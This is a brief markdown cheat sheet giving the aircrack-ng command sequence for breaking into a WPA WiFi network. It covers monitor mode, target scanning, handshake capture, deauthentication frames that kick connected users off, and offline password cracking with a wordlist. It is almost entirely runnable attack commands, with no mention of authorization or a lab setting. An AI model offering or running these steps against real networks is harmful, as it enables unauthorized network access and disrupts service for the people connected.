# WiFi Hacking Sequence

1. **Set network card to monitor mode**

```bash
sudo airmon-ng start wlan0
Tip: Specific network card needed
Tip 2: wlan0 => WiFi

Search for the exact WiFi

sudo airodump-ng wlan0mon  # means monitor WiFi
Tip: Get BSSID (MAC) and CH (channel)

Capture (get) handshake
(handshake means the invites both send to each other to identify themselves and connect to the WiFi)

sudo airodump-ng -c <CH> --bssid <bssid> -w file_capt wlan0mon
Faster code (kick users for faster capture):

sudo aireplay-ng -0 <deauth invites int> -a <bssid> wlan0mon
Tip: -a means focus on that specific bssid

Break the password
(based on the handshake data)

aircrack-ng -w <path-to-wordlist.txt> -b <bssid> file_capt.cap
Tip: for weird passwords, use dedicated wordlist (custom)
